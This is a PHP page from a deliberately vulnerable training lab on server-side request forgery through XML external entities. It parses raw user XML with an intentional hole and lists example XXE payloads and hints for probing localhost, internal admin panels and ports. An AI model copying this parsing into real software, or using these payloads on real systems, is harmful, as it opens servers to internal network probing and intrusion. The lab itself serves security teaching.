<?php include '../includes/header.php'; ?>

        <div class="main-content">
            <h2>Level 4 - SSRF via XXE</h2>
            
            <div style="margin: 20px 0; padding: 15px; background: #e7f3ff; border-radius: 5px; border-left: 3px solid #007bff;">
                <h3>📖 Lab Description</h3>
                <p>
                    This lab demonstrates Server-Side Request Forgery (SSRF) via XXE. The server allows external 
                    entity references to internal network resources, allowing attackers to probe internal services.
                </p>
            </div>

            <div class="xml-form">
                <h3>XML Input:</h3>
                <form method="POST">
                    <textarea name="xml_input" placeholder="Enter XML here..."><?php 
                        echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY internal SYSTEM "http://127.0.0.1:80/">
]>
<data>
    <response>&internal;</response>
</data>'); 
                    ?></textarea>
                    <br>
                    <button type="submit">Parse XML</button>
                </form>
            </div>

            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_input'])) {
                $xml = $_POST['xml_input'];
                
                // Vulnerable XML parsing - allows SSRF through external entities
                $result = simplexml_load_string($xml);
                
                if ($result) {
                    echo '<div class="results">';
                    echo '<h3>✅ Parsing Results:</h3>';
                    echo '<pre>' . htmlspecialchars(print_r($result, true)) . '</pre>';
                    echo '</div>';
                } else {
                    echo '<div class="error">';
                    echo '<h3>❌ Parsing Error:</h3>';
                    echo '<pre>' . htmlspecialchars(libxml_get_last_error()->message) . '</pre>';
                    echo '</div>';
                }
            }
            ?>

            <div class="examples">
                <h3>💡 Example Payloads:</h3>
                
                <h4>Access Localhost Web Server:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY local SYSTEM "http://127.0.0.1/">
]>
<data>
    <response>&local;</response>
</data>'); ?></pre>
                
                <h4>Access Internal Service on Port 8080:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY internal SYSTEM "http://10.0.0.1:8080/admin">
]>
<data>
    <response>&internal;</response>
</data>'); ?></pre>
                
                <h4>Check if Port is Open (TCP Connect):</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY portcheck SYSTEM "http://192.168.1.1:22">
]>
<data>
    <response>&portcheck;</response>
</data>'); ?></pre>
            </div>

            <div class="hints">
                <h3>💡 Hints:</h3>
                <ul>
                    <li>Try accessing localhost (127.0.0.1) with different ports</li>
                    <li>Common internal network ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</li>
                    <li>Check for internal services like database servers, admin panels</li>
                    <li>Try different protocols: http://, https://, ftp://, etc.</li>
                </ul>
            </div>
        </div>

<?php include '../includes/footer.php'; ?>
